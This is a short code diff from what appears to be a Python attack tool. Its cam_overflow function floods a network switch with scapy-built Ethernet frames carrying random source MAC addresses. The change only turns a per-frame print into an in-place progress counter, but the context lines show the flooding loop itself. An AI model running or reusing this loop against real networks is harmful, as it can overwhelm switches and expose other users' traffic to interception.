@@ -26,7 +26,7 @@ def cam_overflow(args: dict)->None:
             try:
                 eth_src=rand_eth()
                 scapy.sendp(Ether(src=eth_src, dst=eth_dst if eth_dst else rand_eth()) / (input), verbose=False, iface=iface)
-                print(f"Sent ethernet frame from MAC: {eth_src}")
+                print(f"\r{sent_packets}. Sent ethernet frame from MAC: {eth_src}", end='')
                 sent_packets += 1
             except Exception as e:
                 print(f"{Fatal_Error}Packet was not sent: {Error_text}{e}{Clear}")
